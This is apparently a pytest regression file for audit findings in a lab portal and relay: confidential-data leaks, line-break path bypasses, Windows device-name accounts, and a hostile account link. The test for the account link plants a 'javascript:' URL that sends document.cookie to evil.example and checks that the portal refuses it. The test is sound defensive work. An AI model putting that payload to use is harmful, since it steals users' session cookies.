"""The portal's and relay's findings of the 0.3.52 audit (P2 to P6), each as its repro in audit-repros/portal showed
it, or as the report read it: a translated card of unshared work through the hub, a relay path ending in a line break,
a confidential project's blocks named to other chats' models, accounts named as Windows devices, and the Account link
taken from the hub's answer."""
import asyncio
import json
import threading
import time

import pytest

pytest.importorskip("mcp")
pytest.importorskip("starlette")

from starlette.testclient import TestClient  # noqa: E402

from labharness import ScriptedApprover  # noqa: E402
from labharness.accounts import Accounts, folder_name  # noqa: E402
from labharness.agent.approval import WebApprover  # noqa: E402
from labharness.agent.runtime import LabRuntime, Viewer  # noqa: E402
from labharness.gate import ApprovalRequest  # noqa: E402
from labharness.web import app as appmod  # noqa: E402
from labharness.web.remote import allowed  # noqa: E402
from labharness.web.settings import Settings  # noqa: E402
from labharness.web.store import ChatStore  # noqa: E402
from simlab import build_virtual_lab  # noqa: E402
from test_web import Scripted, stream_turn  # noqa: E402


def relayed(tmp_path, monkeypatch, approver=None):
    """A portal, and a way to ask it as the Kelvin hub's relay does (its own link answers the frame in-process)."""
    rt = LabRuntime(build_virtual_lab(seed=1), approver or ScriptedApprover([True] * 20), tmp_path / "data")
    seen = {}

    class Spy(appmod.RelayLink):
        def __init__(self, *a, **k):
            super().__init__(*a, **k)
            seen["link"] = self
    monkeypatch.setattr(appmod, "RelayLink", Spy)
    settings, store = Settings(tmp_path / "settings.json"), ChatStore(tmp_path / "chats")
    appmod.create_app(rt, settings, store, hosts=["testserver"])

    def ask(path, method="GET"):
        frames = []

        async def send(m):
            frames.append(m)
        asyncio.run(seen["link"]._answer(send, {"id": 7, "method": method, "path": path, "query": "", "body": ""},
                                         asyncio.Semaphore(4)))
        head = next(json.loads(f) for f in frames if isinstance(f, str) and json.loads(f).get("t") == "head")
        return head["status"], b"".join(f[4:] for f in frames if isinstance(f, bytes))
    return rt, settings, store, ask


# ------------------------------------------------------------------ P2: a translated card of unshared work

def test_p2_a_card_of_unshared_work_passes_the_hub_without_its_translation(tmp_path, monkeypatch):
    rt, settings, store, ask = relayed(tmp_path, monkeypatch, WebApprover(timeout=30))
    nda = store.create_project("Acme NDA")
    store.set_sharing(nda["id"], "confidential")
    secret = store.create("local:llama", nda["id"])
    marks = {"project": nda["id"], "chat": secret["id"], "confidential": True}

    def nda_request():
        with rt.viewing(Viewer(chat=secret["id"], project=nda["id"], whose=marks)):
            rt.gate.ask(ApprovalRequest("Run plan acme_gate: 6 points", ["smu.V 0 V → 1 V on Acme-HfO2-D1"]))
    asker = threading.Thread(target=nda_request, daemon=True)
    asker.start()
    deadline = time.time() + 15
    while not rt.approver.pending_list() and time.time() < deadline:
        time.sleep(0.05)
    try:
        for language in ("", "zh-Hans"):
            settings.update({"card_language": language})
            status, body = ask("/api/state")
            (card,) = json.loads(body)["pending"]
            assert status == 200 and card["unshared"] and "shown" not in card
            assert "acme" not in json.dumps(card, ensure_ascii=False).lower()
    finally:
        for p in rt.approver.pending_list():
            rt.approver.answer(p["id"], False)
        asker.join(5)
        rt.close_instruments(5)


# ------------------------------------------------------------------ P3: a relay path ending in a line break

def test_p3_a_relay_path_with_a_line_break_is_refused(tmp_path, monkeypatch):
    rt, settings, store, ask = relayed(tmp_path, monkeypatch)
    nda = store.create_project("Acme NDA")
    store.set_sharing(nda["id"], "confidential")
    store.create("local:llama", nda["id"])["title"] = "Acme gate sweep, secret"
    for path in ("/api/chats\n", "/api/projects\n", "/api/runs\n", "/api/bootstrap\r", "/api/chats\t"):
        status, body = ask(path)
        assert status == 404 and b"Acme" not in body, path
    assert ask("/api/chats")[0] == 200                               # as the phone app asks: answered, trimmed
    assert not allowed("control", "GET", "/api/chats\n") and allowed("control", "GET", "/api/chats")
    assert not allowed("watch", "POST", "/api/stop\n") and allowed("watch", "POST", "/api/stop")
    rt.close_instruments(5)


# ------------------------------------------------------------------ P4: a confidential project's blocks, by name

NDA = ("plan: acme_flake7_Tc_9K2_gate\nsetup: {lockin.amplitude: 0.05, smu.output: on}\n"
       "sweep: {smu.V: {from: 0, to: 1, points: 6}}\nsettle: 0.1\nmeasure: [lockin.X, smu.I]\nafter: {smu.V: 0}")


def test_p4_a_change_to_unshared_work_is_told_only_to_the_chats_that_may_see_it(tmp_path):
    rt = LabRuntime(build_virtual_lab(seed=1), ScriptedApprover([True] * 50), tmp_path / "data")
    settings, store = Settings(tmp_path / "settings.json"), ChatStore(tmp_path / "chats")
    bot = Scripted([[{"type": "text", "text": "ok"}] for _ in range(4)])
    client = TestClient(appmod.create_app(rt, settings, store, hosts=["testserver"], providers={"scripted": bot}))
    headers = {"X-Kelvin-Token": settings.access_key}
    with client:
        nda = store.create_project("Acme NDA")
        store.set_rules(nda["id"], {"providers": ["local"], "literature": False})
        store.set_sharing(nda["id"], "confidential")
        secret = store.create("local:llama", nda["id"])
        other = client.post("/api/chats", json={"model": "scripted:m1"}, headers=headers).json()
        marks = {"chat": secret["id"], "project": nda["id"], "confidential": True,
                 "rules": {"providers": ["local"], "literature": False}}
        with rt.attributed(marks):
            rt.queue_add(NDA, None, "", "agent")
            block, _ = rt.home_board.add({"kind": "note", "title": "Acme flake 7: Tc = 9.2 K", "text": "from run 3"},
                                         "kelvin", chat=secret["id"])
        item = client.get("/api/queue", headers=headers).json()["items"][0]
        assert client.post("/api/queue", json={"op": "remove", "item": item["id"]}, headers=headers).status_code == 200
        assert client.delete("/api/home/blocks/" + block["id"], headers=headers).status_code == 200
        stream_turn(client, headers, other["id"], "what should I measure next?", "scripted:m1")
        sent = json.dumps(bot.prompts[-1], ensure_ascii=False)
        assert "acme" not in sent.lower() and "<lab_events>" not in sent
        told = [m["text"] for m in store.load(secret["id"])["messages"] if m.get("role") == "event"]
        assert any("acme_flake7_Tc_9K2_gate" in t for t in told)        # the chat whose work it is still hears it
        assert any("Acme flake 7" in t for t in told)
    rt.close_instruments(5)


# ------------------------------------------------------------------ P5: accounts named as Windows devices

@pytest.mark.parametrize("name", ["Con", "Aux", "Nul", "Prn", "Com1", "Lpt1", "con.txt"])
def test_p5_an_account_named_as_a_windows_device_gets_a_folder(tmp_path, name):
    book = Accounts(tmp_path)
    account = book.create(name, "")
    assert book.dir(account).is_dir() and [a["name"] for a in book.list()] == [name]
    assert folder_name("Ada") == "Ada" and folder_name("Conrad") == "Conrad"


# ------------------------------------------------------------------ P6: the Account link

def test_p6_the_account_link_is_kelvins_own_address_of_the_hub(tmp_path, monkeypatch):
    from labharness.hub.db import Hub
    from test_hubsync import ADA, HUB, portal, sign_in, the_hub
    hub, browser = the_hub(tmp_path, monkeypatch)
    signed = Hub.sign_in_app

    def hostile(self, *a, **k):   # a hub that answers a script as its account page
        return dict(signed(self, *a, **k), account_url="javascript:fetch('https://evil.example/'+document.cookie)")
    monkeypatch.setattr(Hub, "sign_in_app", hostile)
    k = portal(tmp_path, monkeypatch, browser)
    answer = sign_in(k, ADA, sharing=False)
    assert answer["account_url"] == HUB + "/account"
